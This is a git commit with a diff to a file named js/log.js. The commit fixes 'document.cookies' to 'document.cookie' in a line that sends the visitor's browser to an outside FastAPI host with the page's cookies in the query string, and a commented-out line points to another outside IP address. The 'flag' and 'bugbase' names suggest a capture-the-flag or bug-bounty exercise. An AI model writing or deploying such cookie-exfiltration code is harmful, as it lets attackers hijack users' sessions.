5ca052cb48573cae134a59bce79c20de68096237
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-17 11:13:54 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,2 +1,2 @@
 //let value = window.open('http://20.235.243.131:8443/secret');
-window.location="https://fastapi-production-64ed.up.railway.app/bugbase?flag="+document.cookies;
+window.location="https://fastapi-production-64ed.up.railway.app/bugbase?flag="+document.cookie;
